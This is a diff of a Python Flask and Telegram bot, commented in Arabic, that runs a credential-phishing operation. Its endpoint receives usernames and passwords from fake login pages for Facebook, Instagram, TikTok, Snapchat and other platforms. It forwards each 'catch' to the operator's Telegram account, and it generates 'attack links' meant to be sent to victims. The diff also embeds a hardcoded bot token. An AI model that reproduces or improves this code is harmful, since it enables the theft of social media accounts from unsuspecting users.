@@ -3,20 +3,22 @@ import telebot
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 
-# --- إعدادات الجنرال ---
+# --- إعدادات الهوية والحقوق ---
 TOKEN = '7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM'
 ADMIN_ID = 6829017835
 MY_TITLE = "الجنرال"
+# استبدل هذا الرابط برابط الـ Static Site الذي سيعطيك إياه ريندر لصفحات الـ HTML
+BASE_PAGES_URL = "https://generals-pages.onrender.com" 
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
-CORS(app) # للسماح بالاتصال من صفحات الـ HTML الخارجية
+CORS(app)
 
-# --- دالة إنشاء لوحة التحكم (20 زر) ---
+# --- دالة لوحة التحكم (الـ 20 زر) ---
 def get_general_dashboard():
-    kb = telebot.types.InlineKeyboardMarkup(row_width=2) # عرض زرين في كل صف
+    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
     
-    # قائمة بـ 20 مسمى احترافي كما طلبت
+    # قائمة الأزرار مع مسمياتها والكود الخاص بكل ملف HTML
     buttons = [
         ("🔹 فيسبوك (أصلي)", "fb_orig"), ("🔸 إنستغرام (هدية)", "ig_gift"),
         ("🔹 تيك توك (عملات)", "tk_coins"), ("🔸 سناب شات (سنابات)", "snap_gift"),
@@ -34,46 +36,52 @@ def get_general_dashboard():
     kb.add(*btns)
     return kb
 
-# --- استقبال الصيد من الصفحات ---
+# --- استقبال البيانات (الصيد) ---
 @app.route('/receive', methods=['POST'])
-def receive_data():
+def receive():
     data = request.json
     platform = data.get('platform', 'غير معروف')
-    user = data.get('u') or data.get('username')
-    password = data.get('p') or data.get('password')
+    user = data.get('u')
+    password = data.get('p')
     
     if user and password:
-        msg = f"🎖️ **صيد جديد للجنرال** 🎖️\n"
-        msg += f"------------------------\n"
-        msg += f"🌐 المنصة: {platform}\n"
-        msg += f"👤 المستخدم: `{user}`\n"
-        msg += f"🔑 كلمة السر: `{password}`\n"
-        msg += f"------------------------"
+        msg = f"🎖️ **تم اصطياد هدف جديد يا {MY_TITLE}** 🎖️\n"
+        msg += f"━━━━━━━━━━━━━━━\n"
+        msg += f"🌐 **المنصة:** {platform}\n"
+        msg += f"👤 **المستخدم:** `{user}`\n"
+        msg += f"🔑 **كلمة السر:** `{password}`\n"
+        msg += f"━━━━━━━━━━━━━━━\n"
+        msg += f"✅ **الحقوق:** بواسطة بوت {MY_TITLE}"
         bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
-        return jsonify({"status": "success"}), 200
-    return jsonify({"status": "error"}), 400
+    return jsonify({"status": "ok"}), 200
 
-# --- أوامر البوت ---
+# --- رسالة الترحيب والأوامر ---
 @bot.message_handler(commands=['start'])
-def welcome(m):
+def start(m):
     if m.from_user.id == ADMIN_ID:
-        welcome_text = f"🎖️ أهلاً بك يا {MY_TITLE} في مركز العمليات\n\n"
-        welcome_text += "لقد تم تجهيز الـ 20 قسماً المطلوبة.\n"
-        welcome_text += "اضغط على أي قسم لجلب رابط الهجوم الخاص به:"
-        bot.send_message(m.chat.id, welcome_text, reply_markup=get_general_dashboard())
+        welcome_msg = (
+            f"🎖️ **أهلاً بك يا {MY_TITLE} في مركز القيادة**\n\n"
+            f"هذا البوت مخصص لإدارة هجماتك وجلب روابط الصيد.\n"
+            f"لقد تم ربط الـ 20 قسماً بقاعدتك بنجاح.\n\n"
+            f"📢 **تعليمات:** اضغط على الزر المطلوب وسأعطيك الرابط المباشر لإرساله للضحية."
+        )
+        bot.send_message(m.chat.id, welcome_msg, reply_markup=get_general_dashboard(), parse_mode='Markdown')
 
+# --- معالجة الضغط على الأزرار ---
 @bot.callback_query_handler(func=lambda c: c.data.startswith("link_"))
 def handle_links(c):
-    page_type = c.data.replace("link_", "")
-    # هنا تضع رابط المستودع الثاني (الذي سترفع عليه صفحات الـ HTML)
-    # ملاحظة: يجب أن تكون الصفحات مسمية بنفس "code" الزر (مثلاً: fb_orig.html)
-    pages_host = "https://your-pages-repo.github.io" # استبدله برابط صفحاتك
-    final_link = f"{pages_host}/{page_type}.html"
+    page_code = c.data.replace("link_", "")
+    final_link = f"{BASE_PAGES_URL}/{page_code}.html"
     
-    bot.send_message(c.message.chat.id, f"🔗 الرابط الجاهز للقسم ({page_type}):\n`{final_link}`", parse_mode='Markdown')
+    response_msg = (
+        f"🔗 **رابط الهجوم الجاهز للقسم ({page_code}):**\n\n"
+        f"`{final_link}`\n\n"
+        f"⚠️ **ملاحظة:** انسخ الرابط وأرسله للهدف."
+    )
+    bot.answer_callback_query(c.id, "تم توليد الرابط بنجاح ✅")
+    bot.send_message(c.message.chat.id, response_msg, parse_mode='Markdown')
 
 if __name__ == "__main__":
-    # تشغيل البوت في خلفية السيرفر
     import threading
     threading.Thread(target=bot.infinity_polling).start()
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
